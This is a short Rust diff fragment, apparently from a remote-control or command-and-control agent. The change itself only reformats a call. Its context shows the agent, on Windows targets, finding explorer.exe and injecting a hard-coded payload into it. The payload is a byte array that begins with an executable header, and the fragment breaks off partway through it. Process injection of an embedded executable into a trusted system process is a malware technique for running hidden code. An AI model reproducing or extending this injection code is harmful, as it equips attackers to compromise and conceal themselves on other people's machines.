@@ -45,7 +45,9 @@ pub async fn run(server: Arc<RwLock<ServerObj>>) -> Result<()> {
     if client.target_platform().await? == TargetPlatform::Windows {
         process_agent
             .inject_shellcode_by_id(
-                process_agent.get_id_by_name("explorer.exe".into()).await?,
+                process_agent
+                    .get_id_by_name("explorer.exe".to_string())
+                    .await?,
                 vec![
                     0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xff,
                     0xff, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
